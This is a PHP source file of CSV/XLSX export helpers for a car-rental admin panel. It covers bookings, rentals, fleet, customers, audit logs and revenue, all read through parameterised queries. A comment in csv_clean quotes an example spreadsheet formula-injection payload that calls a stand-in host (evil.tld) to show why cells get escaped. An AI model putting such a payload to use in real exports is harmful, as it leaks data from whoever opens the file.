<?php
/* includes/export.php - CSV export helper functions. */
/**
 * Carvella CSV export helpers.
 *
 * All values are escaped by fputcsv() (RFC 4180: commas, quotes and
 * newlines are enclosed in double quotes). Files are written as UTF-8
 * with a BOM so Microsoft Excel renders special characters correctly.
 */

require_once __DIR__ . '/functions.php';

if (!function_exists('csv_clean')) {

    /** Null-safe string normalisation for a CSV cell. */
    function csv_clean($value)
    {
        if ($value === null) {
            return '';
        }
        $value = (string) $value;
        $value = str_replace(["\r\n", "\r"], "\n", $value);

        // Neutralise spreadsheet formula injection. A cell whose first
        // meaningful character is one of = + - @ (or a leading tab/CR) is
        // evaluated as a formula by Excel, Google Sheets and LibreOffice,
        // e.g. =HYPERLINK("http://evil.tld","Click me") exfiltrates data
        // the moment an admin opens the export. Prefixing a single quote
        // forces the cell to be read as literal text.
        //
        // Genuine numbers must stay numeric so spreadsheets can still total
        // and sort them, so -1234.50 and 1.2E+3 are deliberately skipped.
        if ($value !== '' && !is_numeric($value)) {
            $probe = ltrim($value, " \t\r\n");
            if ($probe !== '' && strpos("=+-@", $probe[0]) !== false) {
                return "'" . $value;
            }
        }

        return $value;
    }

    /** Format a DATE value as YYYY-MM-DD (empty for NULL/zero dates). */
    function csv_date($value)
    {
        $value = csv_clean($value);
        if ($value === '' || strpos($value, '0000-00-00') === 0) {
            return '';
        }
        $ts = strtotime($value);
        return $ts === false ? '' : date('Y-m-d', $ts);
    }

    /** Format a DATETIME value as YYYY-MM-DD HH:MM:SS. */
    function csv_datetime($value)
    {
        $value = csv_clean($value);
        if ($value === '' || strpos($value, '0000-00-00') === 0) {
            return '';
        }
        $ts = strtotime($value);
        return $ts === false ? '' : date('Y-m-d H:i:s', $ts);
    }

    /** Format a monetary value with two decimals and no thousands separator. */
    function csv_money($value)
    {
        return number_format((float) $value, 2, '.', '');
    }

    /** Turn an enum/db value such as in_progress into "In Progress". */
    function csv_titlecase($value)
    {
        $value = str_replace('_', ' ', csv_clean($value));
        return $value === '' ? '' : ucwords(strtolower($value));
    }

    /** Stream an Excel (XLSX) download with auto-sized columns and terminate the request. */
    function csv_send($filename, array $headers, array $rows)
    {
        $filename = preg_replace('/[^A-Za-z0-9._-]/', '_', (string) $filename);
        if ($filename === '') {
            $filename = 'carvella_export.xlsx';
        }
        // Prefer Excel output for autofit; keep a sensible extension.
        $filename = preg_replace('/\.csv$/i', '.xlsx', $filename);
        if (substr($filename, -5) !== '.xlsx') {
            $filename .= '.xlsx';
        }

        $cleanHeaders = array_map('csv_clean', $headers);
        $cleanRows = [];
        foreach ($rows as $row) {
            $cleanRows[] = array_map('csv_clean', $row);
        }

        carvella_export_xlsx($filename, $cleanHeaders, $cleanRows);
    }

    /** Run a prepared query and return all rows as an array. */
    function csv_query($sql, $types = '', array $params = [])
    {
        global $conn;
        $stmt = $conn->prepare($sql);
        if ($stmt === false) {
            return [];
        }
        if ($types !== '' && !empty($params)) {
            $stmt->bind_param($types, ...$params);
        }
        $stmt->execute();
        $result = $stmt->get_result();
        $rows = [];
        if ($result) {
            while ($row = $result->fetch_assoc()) {
                $rows[] = $row;
            }
        }
        $stmt->close();
        return $rows;
    }

    /**
     * Registry of exportable datasets. `filters` lists which filter
     * controls the export page should render for that dataset.
     */
    function carvella_export_datasets()
    {
        return [
            'reservations' => [
                'label'       => 'Reservations',
                'description' => 'All customer bookings with renter, vehicle and schedule details.',
                'icon'        => 'calendar-check',
                'filters'     => ['date', 'status', 'vehicle', 'customer'],
                'statuses'    => ['pending', 'confirmed', 'active', 'completed', 'cancelled'],
            ],
            'rentals' => [
                'label'       => 'Rental Records',
                'description' => 'Dispatched rentals including expected and actual return dates.',
                'icon'        => 'car-front',
                'filters'     => ['date', 'status', 'vehicle', 'customer'],
                'statuses'    => ['pending', 'active', 'in_progress', 'completed', 'cancelled', 'overdue'],
            ],
            'vehicles' => [
                'label'       => 'Vehicles',
                'description' => 'Fleet inventory with specifications, rates and availability.',
                'icon'        => 'car-front',
                'filters'     => ['status', 'type', 'vehicle'],
                'statuses'    => ['available', 'rented', 'maintenance', 'unavailable', 'archived'],
                'types'       => ['sedan', 'suv', 'mpv', 'pickup', 'van', 'hatchback'],
            ],
            'customers' => [
                'label'       => 'Customers',
                'description' => 'Registered renters with booking counts and total spend.',
                'icon'        => 'people',
                'filters'     => ['date', 'status'],
                'statuses'    => ['active', 'inactive'],
            ],
            'users' => [
                'label'       => 'Users & Admins',
                'description' => 'All system accounts, their roles and account status.',
                'icon'        => 'person-gear',
                'filters'     => ['date', 'status', 'role'],
                'statuses'    => ['active', 'inactive'],
                'roles'       => ['customer', 'admin', 'maintenance'],
            ],
            'activity' => [
                'label'       => 'Activity Logs',
                'description' => 'Audit trail of system and user actions.',
                'icon'        => 'clock-history',
                'filters'     => ['date', 'action', 'customer'],
            ],
            'rental_transactions' => [
                'label'       => 'Rental Transaction Log',
                'description' => 'Event-by-event audit trail of every rental: creation, dispatch, return, late flags and cancellations.',
                'icon'        => 'receipt',
                'filters'     => ['date', 'vehicle', 'customer', 'event'],
                'events'      => ['reservation_created', 'reservation_approved', 'reservation_cancelled', 'rental_dispatched', 'rental_completed', 'rental_cancelled', 'rental_overdue'],
            ],
            'revenue' => [
                'label'       => 'Revenue Report',
                'description' => 'Rental-ledger revenue (active, in-progress, overdue and completed) for financial review.',
                'icon'        => 'cash-stack',
                'filters'     => ['date', 'vehicle', 'customer'],
            ],
        ];
    }

    /** Normalise incoming filter values into a predictable structure. */
    function carvella_export_filters(array $input, array $dataset)
    {
        $statuses = $dataset['statuses'] ?? [];
        $roles    = $dataset['roles'] ?? [];
        $types    = $dataset['types'] ?? [];

        $status = (string) ($input['status'] ?? '');
        if (!in_array($status, $statuses, true)) {
            $status = '';
        }
        $role = (string) ($input['role'] ?? '');
        if (!in_array($role, $roles, true)) {
            $role = '';
        }
        $type = (string) ($input['type'] ?? '');
        if (!in_array($type, $types, true)) {
            $type = '';
        }

        $isDate = function ($value) {
            return is_string($value) && preg_match('/^\d{4}-\d{2}-\d{2}$/', $value) === 1;
        };

        $action = trim((string) ($input['action'] ?? ''));
        $event  = trim((string) ($input['event'] ?? ''));
        $events = $dataset['events'] ?? [];
        if (!in_array($event, $events, true)) {
            $event = '';
        }

        return [
            'start_date' => $isDate($input['start_date'] ?? '') ? $input['start_date'] : '',
            'end_date'   => $isDate($input['end_date'] ?? '') ? $input['end_date'] : '',
            'status'     => $status,
            'role'       => $role,
            'type'       => $type,
            'vehicle_id' => max(0, (int) ($input['vehicle_id'] ?? 0)),
            'user_id'    => max(0, (int) ($input['user_id'] ?? 0)),
            'action'     => $action,
            'event'      => $event,
        ];
    }

    /** Build the SELECT / FROM / WHERE / ORDER parts for a dataset. */
    function carvella_export_spec($key, array $f)
    {
        $w = [];
        $types = '';
        $params = [];

        $addDate = function ($field) use (&$w, &$types, &$params, $f) {
            if ($f['start_date'] !== '') {
                $w[] = "DATE($field) >= ?";
                $types .= 's';
                $params[] = $f['start_date'];
            }
            if ($f['end_date'] !== '') {
                $w[] = "DATE($field) <= ?";
                $types .= 's';
                $params[] = $f['end_date'];
            }
        };
        $addStatus = function ($field) use (&$w, &$types, &$params, $f) {
            if ($f['status'] !== '') {
                $w[] = "$field = ?";
                $types .= 's';
                $params[] = $f['status'];
            }
        };
        $addVehicle = function ($field) use (&$w, &$types, &$params, $f) {
            if ($f['vehicle_id'] > 0) {
                $w[] = "$field = ?";
                $types .= 'i';
                $params[] = $f['vehicle_id'];
            }
        };
        $addUser = function ($field) use (&$w, &$types, &$params, $f) {
            if ($f['user_id'] > 0) {
                $w[] = "$field = ?";
                $types .= 'i';
                $params[] = $f['user_id'];
            }
        };

        switch ($key) {
            case 'rentals':
                $select = "ren.id AS rental_id, res.booking_reference,
                    CONCAT(u.first_name, ' ', u.last_name) AS customer, u.email,
                    CONCAT(v.brand, ' ', v.model) AS vehicle, v.license_plate,
                    ren.pickup_date, ren.expected_return_date, ren.actual_return_date,
                    ren.duration, ren.total_amount, ren.status, ren.created_at";
                $from = "rentals ren
                    LEFT JOIN reservations res ON ren.reservation_id = res.id
                    JOIN users u ON ren.user_id = u.id
                    JOIN vehicles v ON ren.vehicle_id = v.id";
                $addStatus('ren.status');
                $addDate('ren.pickup_date');
                $addVehicle('ren.vehicle_id');
                $addUser('ren.user_id');
                $order = "ren.created_at DESC";
                break;

            case 'vehicles':
                $select = "id, brand, model, year, type, license_plate, seats, transmission,
                    fuel_type, daily_rate, status, created_at";
                $from = "vehicles";
                $addStatus('status');
                if ($f['type'] !== '') {
                    $w[] = "type = ?";
                    $types .= 's';
                    $params[] = $f['type'];
                }
                $addVehicle('id');
                $order = "brand ASC, model ASC";
                break;

            case 'customers':
                $select = "u.id, u.first_name, u.last_name, u.email, u.phone, u.address, u.status, u.created_at,
                    (SELECT COUNT(*) FROM reservations r WHERE r.user_id = u.id) AS reservation_count,
                    (SELECT COALESCE(SUM(r.total_amount), 0) FROM reservations r WHERE r.user_id = u.id) AS total_spent,
                    (SELECT MAX(r.created_at) FROM reservations r WHERE r.user_id = u.id) AS last_reservation";
                $from = "users u";
                $w[] = "u.role = 'customer'";
                $addStatus('u.status');
                $addDate('u.created_at');
                $order = "u.created_at DESC";
                break;

            case 'users':
                $select = "id, first_name, last_name, email, phone, role, status, created_at, updated_at";
                $from = "users";
                if ($f['role'] !== '') {
                    $w[] = "role = ?";
                    $types .= 's';
                    $params[] = $f['role'];
                }
                $addStatus('status');
                $addDate('created_at');
                $order = "role ASC, first_name ASC";
                break;

            case 'activity':
                $select = "al.id, u.first_name, u.last_name, al.action, al.details, al.ip_address, al.created_at";
                $from = "activity_logs al LEFT JOIN users u ON al.user_id = u.id";
                if ($f['action'] !== '') {
                    $w[] = "al.action = ?";
                    $types .= 's';
                    $params[] = $f['action'];
                }
                $addDate('al.created_at');
                $addUser('al.user_id');
                $order = "al.created_at DESC";
                break;

            case 'rental_transactions':
                $select = "tx.id, tx.rental_id, tx.reservation_id, res.booking_reference,
                    CONCAT(v.brand, ' ', v.model) AS vehicle, v.license_plate,
                    CONCAT(u.first_name, ' ', u.last_name) AS customer, u.email,
                    tx.event_type, tx.from_status, tx.to_status,
                    tx.pickup_date, tx.expected_return_date, tx.actual_return_date,
                    tx.amount, tx.odometer, tx.notes, tx.actor_id, tx.created_at";
                $from = "rental_transactions tx
                    LEFT JOIN reservations res ON tx.reservation_id = res.id
                    LEFT JOIN vehicles v ON v.id = tx.vehicle_id
                    LEFT JOIN users u ON u.id = tx.user_id";
                if ($f['event'] !== '') {
                    $w[] = "tx.event_type = ?";
                    $types .= 's';
                    $params[] = $f['event'];
                }
                $addDate('tx.created_at');
                $addVehicle('tx.vehicle_id');
                $addUser('tx.user_id');
                $order = "tx.created_at DESC, tx.id DESC";
                break;

            case 'revenue':
                // Matches the Analytics dashboard's definition: actual fleet
                // revenue comes from the rentals ledger, not from reservation
                // estimates. Active, in-progress and overdue rentals are the
                // staying-out families; cancelled rentals earn nothing.
                $select = "res.booking_reference, CONCAT(u.first_name, ' ', u.last_name) AS customer,
                    u.email, CONCAT(v.brand, ' ', v.model) AS vehicle, v.license_plate,
                    ren.pickup_date, COALESCE(ren.actual_return_date, ren.expected_return_date) AS return_date,
                    COALESCE(ren.duration, DATEDIFF(COALESCE(ren.actual_return_date, ren.expected_return_date), ren.pickup_date)) AS days,
                    ren.total_amount, ren.status";
                $from = "rentals ren
                    LEFT JOIN reservations res ON ren.reservation_id = res.id
                    JOIN users u ON ren.user_id = u.id
                    JOIN vehicles v ON ren.vehicle_id = v.id";
                $w[] = "ren.status IN ('completed', 'active', 'in_progress', 'overdue')";
                $addDate('ren.pickup_date');
                $addVehicle('ren.vehicle_id');
                $addUser('ren.user_id');
                $order = "ren.pickup_date DESC, ren.id DESC";
                break;

            case 'reservations':
            default:
                $key = 'reservations';
                $select = "r.booking_reference, CONCAT(u.first_name, ' ', u.last_name) AS customer,
                    u.email, u.phone, CONCAT(v.brand, ' ', v.model) AS vehicle, v.license_plate,
                    r.pickup_date, r.return_date, r.pickup_location, r.return_location, r.license_no,
                    r.protection, r.protection_fee, r.total_amount, r.status,
                    r.payment_method, r.payment_reference, r.payment_amount, r.payment_status,
                    r.created_at";
                $from = "reservations r
                    JOIN users u ON r.user_id = u.id
                    JOIN vehicles v ON r.vehicle_id = v.id";
                $addStatus('r.status');
                $addDate('r.pickup_date');
                $addVehicle('r.vehicle_id');
                $addUser('r.user_id');
                $order = "r.created_at DESC";
                break;
        }

        return [
            'key'    => $key,
            'select' => $select,
            'from'   => $from,
            'where'  => $w ? (' WHERE ' . implode(' AND ', $w)) : '',
            'types'  => $types,
            'params' => $params,
            'order'  => $order,
        ];
    }

    /** Column headers for a dataset (logical order). */
    function carvella_export_headers($key)
    {
        switch ($key) {
            case 'rentals':
                return ['Rental ID', 'Booking Reference', 'Customer', 'Email', 'Vehicle', 'License Plate',
                    'Pickup Date', 'Expected Return', 'Actual Return', 'Duration (days)',
                    'Total Amount (PHP)', 'Status', 'Created On'];
            case 'vehicles':
                return ['Vehicle ID', 'Brand', 'Model', 'Year', 'Type', 'License Plate', 'Seats',
                    'Transmission', 'Fuel Type', 'Daily Rate (PHP)', 'Vehicle Status', 'Added On'];
            case 'customers':
                return ['Customer ID', 'Full Name', 'Email', 'Phone', 'Address', 'Account Status',
                    'Reservations', 'Total Spent (PHP)', 'Last Reservation', 'Registered On'];
            case 'users':
                return ['User ID', 'First Name', 'Last Name', 'Email', 'Phone', 'Role',
                    'Account Status', 'Registered On', 'Last Updated'];
            case 'activity':
                return ['Log ID', 'User', 'Action', 'Details', 'IP Address', 'Date & Time'];
            case 'rental_transactions':
                return ['Event ID', 'Rental ID', 'Reservation ID', 'Booking Reference',
                    'Vehicle', 'License Plate', 'Customer', 'Email',
                    'Event', 'From Status', 'To Status',
                    'Pickup Date', 'Expected Return', 'Actual Return',
                    'Amount (PHP)', 'Odometer (km)', 'Notes', 'Recorded By', 'Date & Time'];
            case 'revenue':
                return ['Booking Reference', 'Customer', 'Email', 'Vehicle', 'License Plate',
                    'Pickup Date', 'Return Date', 'Days', 'Total Amount (PHP)', 'Status'];
            case 'reservations':
            default:
                return ['Booking Reference', 'Customer', 'Email', 'Phone', 'Vehicle', 'License Plate',
                    'Pickup Date', 'Return Date', 'Pickup Location', 'Return Location',
                    'Driver License No.', 'Protection Plan', 'Protection Fee (PHP)',
                    'Total Amount (PHP)', 'Status',
                    'Payment Method', 'GCash Reference', 'Deposit Amount (PHP)', 'Payment Status',
                    'Booked On'];
        }
    }

    /** Map a raw database row into a CSV-ready, human-readable row. */
    function carvella_export_map($key, array $r)
    {
        switch ($key) {
            case 'rentals':
                return [
                    (int) $r['rental_id'],
                    csv_clean($r['booking_reference']),
                    trim($r['customer']),
                    csv_clean($r['email']),
                    trim($r['vehicle']),
                    csv_clean($r['license_plate']),
                    csv_date($r['pickup_date']),
                    csv_date($r['expected_return_date']),
                    csv_date($r['actual_return_date']),
                    $r['duration'] === null ? '' : (int) $r['duration'],
                    csv_money($r['total_amount']),
                    csv_titlecase($r['status']),
                    csv_datetime($r['created_at']),
                ];
            case 'vehicles':
                return [
                    (int) $r['id'],
                    csv_clean($r['brand']),
                    csv_clean($r['model']),
                    (int) $r['year'],
                    csv_titlecase($r['type']),
                    csv_clean($r['license_plate']),
                    (int) $r['seats'],
                    csv_titlecase($r['transmission']),
                    csv_titlecase($r['fuel_type']),
                    csv_money($r['daily_rate']),
                    csv_titlecase($r['status']),
                    csv_datetime($r['created_at']),
                ];
            case 'customers':
                return [
                    (int) $r['id'],
                    trim($r['first_name'] . ' ' . $r['last_name']),
                    csv_clean($r['email']),
                    csv_clean($r['phone']),
                    csv_clean($r['address']),
                    csv_titlecase($r['status']),
                    (int) $r['reservation_count'],
                    csv_money($r['total_spent']),
                    csv_date($r['last_reservation']),
                    csv_datetime($r['created_at']),
                ];
            case 'users':
                return [
                    (int) $r['id'],
                    csv_clean($r['first_name']),
                    csv_clean($r['last_name']),
                    csv_clean($r['email']),
                    csv_clean($r['phone']),
                    csv_titlecase($r['role']),
                    csv_titlecase($r['status']),
                    csv_datetime($r['created_at']),
                    csv_datetime($r['updated_at']),
                ];
            case 'activity':
                $name = trim(($r['first_name'] ?? '') . ' ' . ($r['last_name'] ?? ''));
                return [
                    (int) $r['id'],
                    $name !== '' ? $name : 'System',
                    csv_clean($r['action']),
                    csv_clean($r['details']),
                    csv_clean(in_array($r['ip_address'], ['::1', '127.0.0.1', '::ffff:127.0.0.1'], true) ? '' : $r['ip_address']),
                    csv_datetime($r['created_at']),
                ];
            case 'rental_transactions':
                $name = trim(($r['customer'] ?? '') . '');
                return [
                    (int) $r['id'],
                    $r['rental_id'] === null ? '' : (int) $r['rental_id'],
                    $r['reservation_id'] === null ? '' : (int) $r['reservation_id'],
                    csv_clean($r['booking_reference']),
                    trim((string) $r['vehicle']),
                    csv_clean($r['license_plate']),
                    $name !== '' ? $name : '',
                    csv_clean($r['email']),
                    csv_titlecase($r['event_type']),
                    csv_titlecase($r['from_status']),
                    csv_titlecase($r['to_status']),
                    csv_date($r['pickup_date']),
                    csv_date($r['expected_return_date']),
                    csv_date($r['actual_return_date']),
                    csv_money($r['amount']),
                    $r['odometer'] === null ? '' : (int) $r['odometer'],
                    csv_clean($r['notes']),
                    $r['actor_id'] === null ? 'System' : 'Staff #' . (int) $r['actor_id'],
                    csv_datetime($r['created_at']),
                ];
            case 'revenue':
                return [
                    csv_clean($r['booking_reference']),
                    trim($r['customer']),
                    csv_clean($r['email']),
                    trim($r['vehicle']),
                    csv_clean($r['license_plate']),
                    csv_date($r['pickup_date']),
                    csv_date($r['return_date']),
                    (int) $r['days'],
                    csv_money($r['total_amount']),
                    csv_titlecase($r['status']),
                ];
            case 'reservations':
            default:
                return [
                    csv_clean($r['booking_reference']),
                    trim($r['customer']),
                    csv_clean($r['email']),
                    csv_clean($r['phone']),
                    trim($r['vehicle']),
                    csv_clean($r['license_plate']),
                    csv_date($r['pickup_date']),
                    csv_date($r['return_date']),
                    csv_clean($r['pickup_location']),
                    csv_clean($r['return_location']),
                    csv_clean($r['license_no']),
                    csv_clean($r['protection']),
                    csv_money($r['protection_fee']),
                    csv_money($r['total_amount']),
                    csv_titlecase($r['status']),
                    // The GCash deposit the customer sent. A booking with no
                    // capture is left blank rather than filled with a zero
                    // that would read like a free deposit.
                    csv_titlecase($r['payment_method'] ?? ''),
                    csv_clean($r['payment_reference'] ?? ''),
                    ((float)($r['payment_amount'] ?? 0)) > 0 ? csv_money($r['payment_amount']) : '',
                    csv_titlecase($r['payment_status'] ?? ''),
                    csv_datetime($r['created_at']),
                ];
        }
    }

    /** Count how many records match the given filters. */
    function carvella_export_count($key, array $f)
    {
        $spec = carvella_export_spec($key, $f);
        $sql = "SELECT COUNT(*) AS total FROM " . $spec['from'] . $spec['where'];
        $rows = csv_query($sql, $spec['types'], $spec['params']);
        return isset($rows[0]['total']) ? (int) $rows[0]['total'] : 0;
    }

    /**
     * Build a complete export payload.
     *
     * @param string $key    Dataset key.
     * @param array  $f      Normalised filters (see carvella_export_filters).
     * @param int    $limit  Row limit for previews (0 = all rows).
     */
    function carvella_export_build($key, array $f, $limit = 0)
    {
        $datasets = carvella_export_datasets();
        if (!isset($datasets[$key])) {
            $key = 'reservations';
        }

        $spec = carvella_export_spec($key, $f);
        $sql = "SELECT " . $spec['select'] . " FROM " . $spec['from'] . $spec['where'] . " ORDER BY " . $spec['order'];
        $limit = max(0, (int) $limit);
        if ($limit > 0) {
            $sql .= " LIMIT " . $limit;
        }
        $raw = csv_query($sql, $spec['types'], $spec['params']);

        $rows = [];
        foreach ($raw as $row) {
            $rows[] = carvella_export_map($key, $row);
        }

        return [
            'key'     => $key,
            'dataset' => $datasets[$key],
            'headers' => carvella_export_headers($key),
            'rows'    => $rows,
            'count'   => carvella_export_count($key, $f),
            'filename'=> carvella_export_filename($key, $f),
        ];
    }

    /** Descriptive, dated CSV filename. */
    function carvella_export_filename($key, array $f)
    {
        if ($f['start_date'] !== '' && $f['end_date'] !== '' && $f['start_date'] !== $f['end_date']) {
            return $key . '_' . $f['start_date'] . '_to_' . $f['end_date'] . '.csv';
        }
        if ($f['start_date'] !== '' && $f['start_date'] !== $f['end_date']) {
            return $key . '_from_' . $f['start_date'] . '.csv';
        }
        if ($f['end_date'] !== '') {
            return $key . '_until_' . $f['end_date'] . '.csv';
        }
        return $key . '_' . date('Y-m-d') . '.csv';
    }
}

/* End of includes/export.php */
